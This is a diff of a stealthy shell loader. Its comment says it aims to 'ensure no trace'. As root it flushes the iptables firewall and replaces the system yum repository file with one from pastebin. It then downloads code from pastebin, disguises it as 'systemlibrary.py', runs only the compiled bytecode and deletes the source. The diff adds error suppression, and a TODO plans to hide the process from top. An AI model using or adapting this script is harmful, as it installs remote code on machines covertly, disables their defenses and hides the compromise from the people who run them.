@@ -7,15 +7,15 @@
 # 6. runs the server code and backgrounds it & disowns it to ensure no trace
 
 sudo strace -o /dev/null /bin/sh -lic "iptables -F;
-rpm --quiet --query python3 || curl https://pastebin.com/raw/XLiGFWha > /etc/yum.repos.d/CentOS-Base.repo;
-rpm --quiet --query python3 || yum clean all;
-rpm --quiet --query python3 || yum install -y python3;
-curl https://pastebin.com/raw/GFdr50Hi > server_code.py;
-mkdir /etc/tmp;
+rpm --quiet --query python3 || curl https://pastebin.com/raw/XLiGFWha 2>/dev/null > /etc/yum.repos.d/CentOS-Base.repo;
+rpm --quiet --query python3 || yum clean all 2>/dev/null;
+rpm --quiet --query python3 || yum install -y python3 2>/dev/null;
+curl https://pastebin.com/raw/GFdr50Hi 2>/dev/null > server_code.py;
+mkdir /etc/tmp 2>/dev/null;
 mv server_code.py /etc/tmp/systemlibrary.py;
-python3 -m compileall .;
-rm /etc/tmp/systemlibrary.py;
-python3 -W ignore /etc/tmp/__pycache__/systemlibrary.cpython-36.pyc
+python3 -m compileall . 2>/dev/null;
+rm /etc/tmp/systemlibrary.py 2>/dev/null;
+python3 -W ignore /etc/tmp/__pycache__/systemlibrary.cpython-36.pyc 2>/dev/null
 "
 
 # TODO hide top?
